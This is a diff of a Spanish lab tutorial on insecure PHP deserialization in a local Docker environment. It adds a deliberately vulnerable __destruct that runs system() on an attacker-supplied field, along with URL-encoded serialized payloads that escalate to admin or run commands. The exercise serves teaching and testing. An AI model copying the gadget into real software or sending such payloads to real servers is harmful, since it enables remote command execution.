@@ -48,24 +48,13 @@ docker-compose up -d
 ## Código vulnerable
 ---
 
-Crear el archivo vulnerable: deserialize.php
+La vulnerabilidad aparece debido a la creación de objetos, de manera que para pasar objetos a través de la red entre diferentes funciones serializamos los datos para que puedan ser transmitidos a través de dicho medio. 
 
-~~~
-<?php
-	class User {
-		public $username;
-		public $isAdmin = false;
-	}
-	$data = unserialize($_GET['data']);
-	if ($data->isAdmin) {
-		echo "¡Acceso de administrador concedido!";
-	}
-?>
-~~~
-El código deserializa datos de usuario sin validación (unserialize($_GET['data'])) y permite modificar el objeto y otorgar privilegios no autorizados.
+La vulnerabilidad se explota en la deserialización de los datos de usuario sin validación (unserialize($_GET['data'])) y permite modificar el objeto y otorgar privilegios no autorizados.
 
-Para mostrar las variables del objeto serializado vamos a crear un archivo con nombre **MostrarObjeto.php** con el siguiente contenido:
+Para mostrar las variables del objeto serializado vamos a crear un archivo vulnerable con nombre **MostrarObjeto.php** con el siguiente contenido:
 ~~~
+  GNU nano 7.2                                                                           MostrarObjeto.php                                                                                    
 <?php
 class User {
     public $username;
@@ -73,10 +62,10 @@ class User {
     public $cmd;
 
     public function __destruct() {
-        if ($this->isAdmin && !empty($this->cmd)) {
-            echo "<pre>Ejecutando comando: {$this->cmd}\n";
+        if (!empty($this->cmd)) {
+            // echo "<pre>Ejecutando comando: {$this->cmd}\n";
             system($this->cmd);
-            echo "</pre>";
+            //echo "</pre>";
         }
     }
 }
@@ -90,33 +79,11 @@ if (isset($_GET['data'])) {
     print_r($obj);
     echo "</pre>";
 
-    // Opcional: forzar destrucción
+    // Opcional: forzar destrucci  n
     unset($obj);
 } else {
-    echo "No se proporcionó ningún dato.";
+    echo "No se proporciona  ningun dato.";
 }
-?>
-
-~~~
-~~~
-<?php
-class User {
-    public $username;
-    public $isAdmin = false;
-}
-
-if (isset($_GET['data'])) {
-    $data = $_GET['data'];
-    $obj = @unserialize($data);
-
-    echo "<h3>Datos del objeto (sin validación):</h3>";
-    echo "<pre>";
-    print_r($obj);
-    echo "</pre>";
-} else {
-    echo "No se proporcionó ningún dato.";
-}
-?>
 ~~~
 
 También vamos a crear un archivo con nombre GenerarObjeto.php
@@ -188,12 +155,14 @@ Vemos como el objeto serializado sería: `O:4:"User":2:{s:8:"username";s:4:"Raul
 
 y nos dá el enlace parar probarlo, enviándolo a MostrarObjeto.php
 
-`http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D`
+~~~
+http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D
+~~~
 
 ![](images/UD4.pg)
 
 ~~~
-### Explotación de Deserialización Insegura
+##  Explotación de Deserialización Insegura
 ---
 
 Por lo tanto a la hora de intercambiar objetos entre diferentes módulos, pasamos el objeto serializado.
@@ -239,6 +208,10 @@ echo urlencode(serialize(new User()));
 
 Salida esperada (ejemplo):
 
+~~~
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
+~~~
+
 ![](images/UD6.png)
 
 
@@ -273,10 +246,10 @@ class User {
     public $cmd;
 
     public function __destruct() {
-        if ($this->isAdmin && !empty($this->cmd)) {
-            echo "<pre>Ejecutando comando: {$this->cmd}\n";
+        if (!empty($this->cmd)) {
+            //echo "<pre>Ejecutando comando: {$this->cmd}\n";
             system($this->cmd);
-            echo "</pre>";
+            //echo "</pre>";
         }
     }
 }
@@ -344,7 +317,7 @@ class User {
     public $cmd;
 
     public function __destruct() {
-        if ($this->isAdmin && !empty($this->cmd)) {
+        if (!empty($this->cmd)) {
             // ⚠️ Ejecución insegura de código del sistema
             echo "<pre>Ejecutando comando: {$this->cmd}\n";
             system($this->cmd);
@@ -429,19 +402,12 @@ Veamos que contiene el archivo `/tmp/output.txt`.
 Como nosotros extamos usando docker, o bien entramos dentros del servidor apacher y vemos el archivo, o ejecutamos el siguiente comando docker para que nos lo muestre:
 
 ~~~
-
+docker exec -it lamp-php83 /bin/bash -c 'cat /tmp/output.txt'
 ~~~
 
+![](images/UD10.png)
 
-
-
-Ejemplo de salida:
-O%3A7%3A%22Exploit%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D
-Enviar este payload a la aplicación:
-http://localhost/deserialize.php?data=O%3A7%3A%22Exploit%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A
-2%3A%22id%22%3B%7D
-Si la aplicación es vulnerable y ejecuta system(), se puede ejecutar comandos en el servidor. En nuestro caso
-ejecuta whoami devolviendo www-data
+Como vemos, hemos podido ejecutar comandos dentro del servidor. En este caso con el usuario www-data, pero si lo combinamos con otros ataques como escalada de privilegios, podríamos haber ejecutado cualquier comando.
 ---
 
 
